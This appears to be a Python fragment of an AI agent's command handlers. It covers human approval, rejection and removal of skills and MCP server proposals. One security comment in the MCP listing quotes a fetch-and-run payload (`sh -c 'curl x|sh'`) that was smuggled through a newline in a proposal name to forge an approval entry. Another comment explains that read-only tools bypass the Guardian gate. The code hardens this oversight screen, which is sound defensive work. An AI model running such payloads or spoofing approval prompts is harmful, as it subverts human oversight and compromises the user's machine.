            await ledger.append(SKILLS_STREAM, Event(
                stream=SKILLS_STREAM, type="updated", ts=clock.now(), trace_id=name, causation_id=None,
                payload={"name": name, "commit": commit, "changed": changed, "status": "waiting"}))
            why = "what Sim runs changed" if decisive else "the review flagged something"
            detail = ("\n  " + "\n  ".join(decisive[:10])) if decisive else ""
            return Outcome(f"{head}; {why}, so it is NOT enabled until you approve it:{detail}\n"
                           f"{review_text(review)}\n`skills approve {name}` to enable the new version.")

    if sub == "approve":
        if not rest:
            return Outcome("usage: skills approve <name>")
        waiting = SKILLS_HOME.expanduser() / "review" / rest.lower()
        if not waiting.is_dir():
            return Outcome(f"nothing waiting called {rest!r}")
        enabled = SKILLS_HOME.expanduser() / "approved" / rest.lower()
        enabled.parent.mkdir(parents=True, exist_ok=True)
        if enabled.exists():
            shutil.rmtree(enabled)
        shutil.move(str(waiting), str(enabled))
        await ledger.append(SKILLS_STREAM, Event(
            stream=SKILLS_STREAM, type="approved", ts=clock.now(), trace_id=rest.lower(), causation_id=None,
            payload={"name": rest.lower(), "path": str(enabled), "status": "enabled"}))
        return Outcome(f"approved: {rest.lower()} is enabled at {enabled}")

    if sub == "remove":
        if not rest:
            return Outcome("usage: skills remove <name>")
        gone = []
        for source, root in _skill_roots():
            if source == "bundled":
                continue
            folder = root / rest.lower()
            if folder.is_dir():
                shutil.rmtree(folder)
                gone.append(str(folder))
        if not gone:
            return Outcome(f"no installed skill called {rest!r} (bundled skills are part of the repo)")
        lock = _read_lock()
        if lock.pop(rest.lower(), None) is not None:
            _write_lock(lock)
        await ledger.append(SKILLS_STREAM, Event(
            stream=SKILLS_STREAM, type="removed", ts=clock.now(), trace_id=rest.lower(), causation_id=None,
            payload={"name": rest.lower(), "paths": gone}))
        return Outcome("removed: " + ", ".join(gone))

    return Outcome(f"skills: no sub-command {sub!r} -- list | show <name> | review <folder> | "
                   f"search [text] | install <git-url> | update <name> | approve <name> | remove <name>")


async def _mcp_command(args: str, *, bus: BusClient, ledger: LedgerClient, clock) -> Outcome:
    parts = args.split(None, 1)
    sub = parts[0] if parts else ""

    if sub == "approve":
        if len(parts) < 2 or not parts[1].strip():
            return Outcome("usage: mcp approve <proposal_id>")
        proposal_id = parts[1].strip()
        pending = await _mcp_pending_proposals(ledger)
        proposal = pending.get(proposal_id)
        if proposal is None:
            return Outcome(f"no pending proposal {proposal_id!r} -- see `mcp` for the current list")
        toml_path = _simorgh_toml_path()
        with toml_path.open("a", encoding="utf-8") as fh:
            fh.write(_mcp_server_toml_block(proposal))
        await ledger.append(MCP_PROPOSALS_STREAM, Event(
            stream=MCP_PROPOSALS_STREAM, type="approved", ts=clock.now(), trace_id="", causation_id=None,
            payload={**proposal, "status": "approved"},
        ))
        return Outcome(f"approved: wrote {proposal['name']!r} to {toml_path} -- restart Sim to load it")

    if sub in ("reject", "deny"):
        if len(parts) < 2 or not parts[1].strip():
            return Outcome("usage: mcp reject <proposal_id> [reason]")
        rest = parts[1].split(None, 1)
        proposal_id, reason = rest[0], (rest[1] if len(rest) > 1 else "")
        pending = await _mcp_pending_proposals(ledger)
        proposal = pending.get(proposal_id)
        if proposal is None:
            return Outcome(f"no pending proposal {proposal_id!r} -- see `mcp` for the current list")
        await ledger.append(MCP_PROPOSALS_STREAM, Event(
            stream=MCP_PROPOSALS_STREAM, type="rejected", ts=clock.now(), trace_id="", causation_id=None,
            payload={**proposal, "status": "rejected", "rejection_reason": reason},
        ))
        return Outcome(f"rejected: {proposal['name']!r}" + (f" -- {reason}" if reason else ""))

    # bare `mcp`: what's pending, and what's already running
    pending = await _mcp_pending_proposals(ledger)
    lines: list[str] = []
    if pending:
        lines.append(f"{len(pending)} pending MCP server proposal(s):")
        for proposal_id, proposal in pending.items():
            # Everything on this line is text the PROPOSER wrote, and
            # only `reason` was sanitised. A newline in `name` forged a
            # whole extra listing entry -- `fs\n  99999999  evil  (sh -c
            # 'curl x|sh')` printed as two proposals, the second one
            # entirely invented, and pushed the real proposal's own
            # command and reason under it; an escape in `command`
            # cleared the screen (observer, 2026-09-10). That is the
            # same padding attack `one_safe_line` was applied to
            # `reason` for, on the fields that say WHICH server this is.
            command_line = render_mod.one_safe_line(
                " ".join([proposal.get("command", ""), *proposal.get("args", [])]))
            name = render_mod.one_safe_line(str(proposal.get("name", "")), limit=60)
            lines.append(f"  {proposal_id}  {name}  ({command_line})")
            lines.append(f"    reason: {render_mod.one_safe_line(proposal.get('reason', ''))}")
            # The two fields that decide what approving this GRANTS, and
            # neither was shown. `read_only_tools` is not a label:
            # `execution/mcp.py` registers each named tool with
            # `reversibility="read_only"`, and Guardian allows a
            # read-only tool in EVERY posture, `locked` included. So the
            # person was granting a permanent gate exemption they had
            # never seen, to tools they had never been told the names of
            # (observer, 2026-09-10). The reason is rendered as one line
            # for the same reason: a multi-line reason could pad itself
            # out to look like more listing entries.
            granted = [str(t) for t in (proposal.get("read_only_tools") or ())]
            if granted:
                lines.append("    GRANTS (Guardian never gates these, even when locked): "
                             + _named_list(granted))
            wanted = [str(k) for k in (proposal.get("env_keys") or ())]
            if wanted:
                lines.append("    wants these secrets: " + _named_list(wanted))
        lines.append("  `mcp approve <id>` or `mcp reject <id> [reason]`")
    else:
        lines.append("no pending MCP server proposals")
    lines.append(await _mcp_active_tools_line(bus))
    return Outcome("\n".join(lines))


__all__ = ["dispatch", "run_shell", "Outcome"]
